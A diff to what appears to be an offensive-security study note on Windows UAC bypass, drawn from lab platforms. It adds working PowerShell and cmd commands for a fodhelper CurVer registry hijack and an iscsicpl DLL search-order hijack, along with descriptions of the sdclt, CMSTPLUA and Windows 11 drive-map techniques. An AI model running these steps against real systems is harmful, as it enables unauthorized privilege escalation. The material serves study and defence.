@@ -4,8 +4,8 @@ type: technique
 tags: [com-hijacking, privilege-escalation, registry, thm, uac-bypass, windows]
 phase: post-exploitation
 date_created: 2026-05-08
-date_updated: 2026-05-08
-sources: [thm-uac-bypass, thm-adcs-cve2022-26923]
+date_updated: 2026-07-14
+sources: [thm-uac-bypass, thm-adcs-cve2022-26923, hacktricks-windows]
 ---
 
 # UAC Bypass
@@ -199,6 +199,53 @@ certipy auth -pfx lundc.pfx
 ```
 
 With the DC machine account hash, an attacker can perform DCSync and fully compromise the domain.
+
+## UAC bypass method families (delta beyond fodhelper and silentcleanup)
+
+Beyond fodhelper, the Disk Cleanup / silentcleanup env-var hijack, eventvwr, and
+token duplication (above), the remaining families:
+
+Auto-elevated binary plus per-user ProgID hijack. Several signed binaries
+auto-elevate and resolve a handler from HKCU without validating it:
+
+```text
+computerdefaults.exe -> HKCU\Software\Classes\ms-settings\Shell\Open\command  (like fodhelper)
+sdclt.exe            -> HKCU\Software\Classes\Folder\shell\open\command  or  exefile\shell\runas\command\isolatedCommand
+```
+
+fodhelper CurVer variant (avoids DelegateExecute): redirect the `ms-settings`
+ProgID through a per-user `CurVer` to a custom extension you map to your payload,
+all in HKCU, so no admin token is needed to plant the keys.
+
+```powershell
+New-Item "HKCU:\Software\Classes\.thm\Shell\Open\command" -Force | Out-Null
+Set-ItemProperty "HKCU:\Software\Classes\.thm\Shell\Open\command" '(default)' "C:\ProgramData\payload.exe"
+Set-ItemProperty "HKCU:\Software\Classes\ms-settings" "CurVer" ".thm"
+Start-Process "$env:WINDIR\System32\fodhelper.exe"
+```
+
+CMSTPLUA COM elevation-moniker: instantiate the auto-elevating `CMSTPLUA` COM
+object via the `Elevation:Administrator!new:` moniker and call its shell/execute
+method (the basis of `runasadmin uac-cmstplua` in offensive frameworks).
+
+Auto-elevate plus DLL search-order hijack. Most UACME techniques drop a DLL that
+an auto-elevating binary loads. `iscsicpl.exe` (SysWOW64) is a clean example:
+place a malicious `iscsiexe.dll` in a user-writable folder and prepend that folder
+to the user `PATH`, and the elevated process loads it with no prompt.
+
+```cmd
+copy iscsiexe.dll %TEMP%\iscsiexe.dll
+reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
+C:\Windows\SysWOW64\iscsicpl.exe
+```
+
+General DLL-hijack methodology: find an auto-elevating binary, use Procmon to spot
+a `NAME NOT FOUND` DLL load, then get the DLL into a protected path via `wusa.exe`
+(Windows 7/8) or the `IFileOperation` COM copy (Windows 10). Newest surface:
+Windows 11 25H2 Administrator Protection has a per-logon DOS-device-map drive
+hijack (impersonate the shadow-admin token at Identification level to own
+`\Sessions\0\DosDevices\<LUID>`, then plant a `C:` symlink). All require the user
+to be in Administrators at Medium Integrity with UAC below the Always-Notify max.
 
 ## Detection and Defence
 
